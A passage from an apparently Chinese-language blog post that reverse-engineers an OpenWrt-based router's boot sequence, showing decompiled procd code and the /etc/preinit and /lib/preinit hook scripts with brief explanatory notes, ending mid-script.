title="&#x2F;sbin&#x2F;procd"></a>&#x2F;sbin&#x2F;procd</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">getenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    dword_1CEE4 = <span class="built_in">atoi</span>(v5);</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;DBGLVL&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">getopt</span>(argc, (<span class="type">char</span> *<span class="type">const</span> *)argv, <span class="string">&quot;d:s:h:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sub_10E20</span>(optarg);</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        dword_1AD68 = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为是-h参数，因此看前面即可，DBGLVL估计是测试debug用的</p><h4 id="sub-10E20"><a href="#sub-10E20" class="headerlink" title="sub_10E20"></a>sub_10E20</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_10E20</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">uloop_init</span>();</span><br><span class="line">  v2 = <span class="built_in">sub_10C5C</span>((<span class="type">const</span> <span class="type">char</span> *)a1);</span><br><span class="line">  <span class="built_in">uloop_run</span>(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_10C5C函数功能如下</p><ol><li><strong>设置热插拔套接字：</strong>（类似usb等）<ul><li>创建并绑定一个套接字，用于处理热插拔事件。</li></ul></li><li><strong>错误处理：</strong><ul><li>如果套接字创建或绑定失败，记录错误信息并退出程序。</li></ul></li><li><strong>配置套接字选项：</strong><ul><li>设置接收缓冲区的大小。</li></ul></li><li><strong>初始化 JSON 脚本：</strong><ul><li>调用初始化函数，准备处理 JSON 脚本。</li></ul></li><li><strong>添加到事件循环：</strong><ul><li>将套接字添加到事件循环中，以便异步处理事件。</li></ul></li></ol><h3 id="etc-preinit"><a href="#etc-preinit" class="headerlink" title="&#x2F;etc&#x2F;preinit"></a>&#x2F;etc&#x2F;preinit</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">[ -z &quot;$PREINIT&quot; ] &amp;&amp; exec /sbin/init</span><br><span class="line"></span><br><span class="line">export PATH=/bin:/sbin:/usr/bin:/usr/sbin</span><br><span class="line"></span><br><span class="line">pi_ifname=</span><br><span class="line">pi_ip=192.168.1.1</span><br><span class="line">pi_broadcast=192.168.1.255</span><br><span class="line">pi_netmask=255.255.255.0</span><br><span class="line"></span><br><span class="line">fs_failsafe_ifname=</span><br><span class="line">fs_failsafe_ip=192.168.1.1</span><br><span class="line">fs_failsafe_broadcast=192.168.1.255</span><br><span class="line">fs_failsafe_netmask=255.255.255.0</span><br><span class="line"></span><br><span class="line">fs_failsafe_wait_timeout=2</span><br><span class="line"></span><br><span class="line">pi_suppress_stderr=&quot;y&quot;</span><br><span class="line">pi_init_suppress_stderr=&quot;y&quot;</span><br><span class="line">pi_init_path=&quot;/bin:/sbin:/usr/bin:/usr/sbin&quot;</span><br><span class="line">pi_init_cmd=&quot;/sbin/init&quot;</span><br><span class="line"></span><br><span class="line">. /lib/functions.sh</span><br><span class="line">. /lib/functions/preinit.sh</span><br><span class="line">. /lib/functions/system.sh</span><br><span class="line">. /lib/functions/userconfig.sh</span><br><span class="line"></span><br><span class="line">boot_hook_init preinit_essential</span><br><span class="line">boot_hook_init preinit_main</span><br><span class="line">boot_hook_init failsafe</span><br><span class="line">boot_hook_init initramfs</span><br><span class="line">boot_hook_init preinit_mount_root</span><br><span class="line"></span><br><span class="line">for pi_source_file in /lib/preinit/*; do</span><br><span class="line">. $pi_source_file</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">boot_run_hook preinit_essential</span><br><span class="line"></span><br><span class="line">pi_mount_skip_next=false</span><br><span class="line">pi_jffs2_mount_success=false</span><br><span class="line">pi_failsafe_net_message=false</span><br><span class="line"></span><br><span class="line">boot_run_hook preinit_main</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">. /lib/functions.sh</span><br><span class="line">. /lib/functions/preinit.sh</span><br><span class="line">. /lib/functions/system.sh</span><br><span class="line">. /lib/functions/userconfig.sh</span><br></pre></td></tr></table></figure><p>function.sh定义了一系列配置函数，</p><p>&#x2F;lib&#x2F;functions&#x2F;preinit.sh中定义了boot_hook_init函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">boot_hook_init() &#123;</span><br><span class="line">local hook=&quot;$&#123;1&#125;_hook&quot;</span><br><span class="line">export -n &quot;PI_STACK_LIST=$&#123;PI_STACK_LIST:+$PI_STACK_LIST &#125;$hook&quot;</span><br><span class="line">export -n &quot;$hook=&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似于boot_hook_init preinit_essential，便有preinit_essential_hook&#x3D; 之类的环境变量</p><p>之后初始化一系列的hook，然后调用&#x2F;lib&#x2F;preinit下的函数</p><p>调用了如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">define_default_set_state() &#123;</span><br><span class="line">. /etc/diag.sh</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main define_default_set_state</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Copyright (c) 2013 The Linux Foundation. All rights reserved.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="function"><span class="title">do_ipq806x</span></span>() &#123;</span></span><br><span class="line">. /lib/ipq806x.sh</span><br><span class="line"></span><br><span class="line">ipq806x_board_detect</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main do_ipq806x</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">commands <span class="keyword">for</span> emitting messages to network <span class="keyword">in</span> failsafe mode</span></span><br><span class="line"></span><br><span class="line">indicate_failsafe_led () &#123;</span><br><span class="line">set_state failsafe</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">indicate_failsafe() &#123;</span><br><span class="line">echo &quot;- failsafe -&quot;</span><br><span class="line">preinit_net_echo &quot;Entering Failsafe!\n&quot;</span><br><span class="line">indicate_failsafe_led</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add failsafe indicate_failsafe</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">preinit_ip() &#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">if</span> the preinit interface isn<span class="string">&#x27;t specified and ifname is set in</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">preinit.arch use that interface</span></span></span><br><span class="line">if [ -z &quot;$pi_ifname&quot; ]; then</span><br><span class="line">pi_ifname=$ifname</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">[ -n &quot;$pi_ifname&quot; ] &amp;&amp; grep -q &quot;$pi_ifname&quot; /proc/net/dev &amp;&amp; &#123;</span><br><span class="line">ifconfig $pi_ifname $pi_ip netmask $pi_netmask broadcast $pi_broadcast up</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preinit_ip_deconfig() &#123;</span><br><span class="line">[ -n &quot;$pi_ifname&quot; ] &amp;&amp; grep -q &quot;$pi_ifname&quot; /proc/net/dev &amp;&amp; &#123;</span><br><span class="line">ifconfig $pi_ifname 0.0.0.0 down</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preinit_net_echo() &#123;</span><br><span class="line">[ -n &quot;$pi_ifname&quot; ] &amp;&amp; grep -q &quot;$pi_ifname&quot; /proc/net/dev &amp;&amp; &#123;</span><br><span class="line">&#123;</span><br><span class="line">[ &quot;$pi_preinit_net_messages&quot; = &quot;y&quot; ] || &#123;</span><br><span class="line">[ &quot;$pi_failsafe_net_message&quot; = &quot;true&quot; ] &amp;&amp;</span><br><span class="line">[ &quot;$pi_preinit_no_failsafe_netmsg&quot; != &quot;y&quot; ]</span><br><span class="line">&#125;</span><br><span class="line">&#125; &amp;&amp; netmsg $pi_broadcast &quot;$1&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preinit_echo() &#123;</span><br><span class="line">preinit_net_echo $1</span><br><span class="line">echo $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pi_indicate_led() &#123;</span><br><span class="line">set_state preinit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pi_indicate_preinit() &#123;</span><br><span class="line">preinit_net_echo &quot;Doing OpenWRT Preinit\n&quot;</span><br><span class="line">pi_indicate_led</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main preinit_ip</span><br><span class="line">boot_hook_add preinit_main pi_indicate_preinit</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">!/bin/sh</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Copyright (C) 2006-2010 OpenWrt.org</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Copyright (C) 2010 Vertical Communications</span></span></span><br><span class="line"></span><br><span class="line">fs_wait_for_key () &#123;</span><br><span class="line">local timeout=$3</span><br><span class="line">local timer</span><br><span class="line">local do_keypress</span><br><span class="line">local keypress_true=&quot;$(mktemp)&quot;</span><br><span class="line">local keypress_wait=&quot;$(mktemp)&quot;</span><br><span class="line">local keypress_sec=&quot;$(mktemp)&quot;</span><br><span class="line">if [ -z &quot;$keypress_wait&quot; ]; then</span><br><span class="line">keypress_wait=/tmp/.keypress_wait</span><br><span class="line">touch $keypress_wait</span><br><span class="line">fi</span><br><span class="line">if [ -z &quot;$keypress_true&quot; ]; then</span><br><span class="line">keypress_true=/tmp/.keypress_true</span><br><span class="line">touch $keypress_true</span><br><span class="line">fi</span><br><span class="line">if [ -z &quot;$keypress_sec&quot; ]; then</span><br><span class="line">keypress_sec=/tmp/.keypress_sec</span><br><span class="line">touch $keypress_sec</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">trap &quot;echo &#x27;true&#x27; &gt;$keypress_true; lock -u $keypress_wait ; rm -f $keypress_wait&quot; INT</span><br><span class="line">trap &quot;echo &#x27;true&#x27; &gt;$keypress_true; lock -u $keypress_wait ; rm -f $keypress_wait&quot; USR1</span><br><span class="line"></span><br><span class="line">[ -n &quot;$timeout&quot; ] || timeout=1</span><br><span class="line">[ $timeout -ge 1 ] || timeout=1</span><br><span class="line">timer=$timeout</span><br><span class="line">lock $keypress_wait</span><br><span class="line">&#123;</span><br><span class="line">while [ $timer -gt 0 ]; do</span><br><span class="line">echo &quot;$timer&quot; &gt;$keypress_sec</span><br><span class="line">timer=$(($timer - 1))</span><br><span class="line">sleep 1</span><br><span class="line">done</span><br><span class="line">lock -u $keypress_wait</span><br><span class="line">rm -f $keypress_wait</span><br><span class="line">&#125; &amp;</span><br><span class="line"></span><br><span class="line">echo &quot;Press the [$1] key and hit [enter] $2&quot;</span><br><span class="line">echo &quot;Press the [1], [2], [3] or [4] key and hit [enter] to select the debug level&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">if we&#x27;</span>re on the console we <span class="built_in">wait</span> <span class="keyword">for</span> input</span></span><br><span class="line">&#123;</span><br><span class="line">while [ -r $keypress_wait ]; do</span><br><span class="line">timer=&quot;$(cat $keypress_sec)&quot;</span><br><span class="line"></span><br><span class="line">[ -n &quot;$timer&quot; ] || timer=1</span><br><span class="line">timer=&quot;$&#123;timer%%\ *&#125;&quot;</span><br><span class="line">[ $timer -ge 1 ] || timer=1</span><br><span class="line">do_keypress=&quot;&quot;</span><br><span class="line">&#123;</span><br><span class="line">read -t &quot;$timer&quot; do_keypress</span><br><span class="line">case &quot;$do_keypress&quot; in</span><br><span class="line">$1)</span><br><span class="line">echo &quot;true&quot; &gt;$keypress_true</span><br><span class="line">;;</span><br><span class="line">1 | 2 | 3 | 4)</span><br><span class="line">echo &quot;$do_keypress&quot; &gt;/tmp/debug_level</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">continue;</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line">lock -u $keypress_wait</span><br><span class="line">rm -f $keypress_wait</span><br><span class="line">&#125;</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line">lock -w $keypress_wait</span><br><span class="line"></span><br><span class="line">keypressed=1</span><br><span class="line">[ &quot;$(cat $keypress_true)&quot; = &quot;true&quot; ] &amp;&amp; keypressed=0</span><br><span class="line"></span><br><span class="line">rm -f $keypress_true</span><br><span class="line">rm -f $keypress_wait</span><br><span class="line">rm -f $keypress_sec</span><br><span class="line"></span><br><span class="line">return $keypressed</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">failsafe_wait() &#123;</span><br><span class="line">        local is_failsafe=$(uci get system.@system[0].failsafe)</span><br><span class="line">        echo &quot;is_failsafe is $is_failsafe&quot; &gt; /dev/console</span><br><span class="line">        if [ $is_failsafe = &quot;true&quot; ]; then </span><br><span class="line">                FAILSAFE=</span><br><span class="line">        grep -q &#x27;failsafe=&#x27; /proc/cmdline &amp;&amp; FAILSAFE=true &amp;&amp; export FAILSAFE</span><br><span class="line">        if [ &quot;$FAILSAFE&quot; != &quot;true&quot; ]; then</span><br><span class="line">                pi_failsafe_net_message=true</span><br><span class="line">                preinit_net_echo &quot;Please press button now to enter failsafe&quot;</span><br><span class="line">                pi_failsafe_net_message=false</span><br><span class="line">                fs_wait_for_key f &#x27;to enter failsafe mode&#x27; $fs_failsafe_wait_timeout &amp;&amp; FAILSAFE=true</span><br><span class="line">                       [ -f &quot;/tmp/failsafe_button&quot; ] &amp;&amp; FAILSAFE=true &amp;&amp; echo &quot;- failsafe button &quot;`cat /tmp/failsafe_button`&quot; was pressed -&quot;</span><br><span class="line">                [ &quot;$FAILSAFE&quot; = &quot;true&quot; ] &amp;&amp; export FAILSAFE &amp;&amp; touch /tmp/failsafe</span><br><span class="line">        fi</span><br><span class="line"></span><br><span class="line">        fi </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main failsafe_wait</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006-2010 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">run_failsafe_hook() &#123;</span><br><span class="line">    if [ &quot;$FAILSAFE&quot; = &quot;true&quot; ]; then</span><br><span class="line">boot_run_hook failsafe</span><br><span class="line">lock -w /tmp/.failsafe</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main run_failsafe_hook</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">indicate_regular_preinit() &#123;</span><br><span class="line">preinit_net_echo &quot;Continuing with Regular Preinit\n&quot;</span><br><span class="line">pi_indicate_led</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main indicate_regular_preinit</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">initramfs_test() &#123;</span><br><span class="line">if [ -n &quot;$INITRAMFS&quot; ]; then</span><br><span class="line">boot_run_hook initramfs</span><br><span class="line">preinit_ip_deconfig</span><br><span class="line">break</span><br><span class="line">fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">boot_hook_add preinit_main initramfs_test</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">do_mount_root() &#123;</span><br><span class="line">ramoverlay</span><br><span class="line">find_mount_jffs2</span><br><span class="line">    rootfs_init_etc_ramfs</span><br><span class="line">boot_run_hook preinit_mount_root</span><br><span class="line"></span><br><span class="line">defFlag=`grep -o Default /tmp/userconfig/userconfig_default.tmp`</span><br><span class="line">if [ -n &quot;$defFlag&quot; ] &amp;&amp; [ $defFlag = &#x27;Default&#x27; ];</span><br><span class="line">then</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">set</span> dftmac from tddp flash</span></span><br><span class="line">/usr/bin/tddpd dftmac</span><br><span class="line">/lib/cfg_save/config.sh save</span><br><span class="line">else</span><br><span class="line">   echo &quot;no&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[ &quot;$INITRAMFS&quot; = &quot;1&quot; ] || boot_hook_add preinit_main do_mount_root</span><br><span class="line">===============================================================================================</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2006 OpenWrt.org</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (C) 2010 Vertical Communications</span></span><br><span class="line"></span><br><span class="line">failsafe_netlogin () &#123;</span><br><span class="line">telnetd -l /bin/login.sh &lt;&gt; /dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">failsafe_shell() &#123;</span><br><span class="line">lock /tmp/.failsafe</span><br><span class="line">ash --login</span><br><span class="line">echo &quot;Please reboot system when done with failsafe network logins&quot;</span><br><span 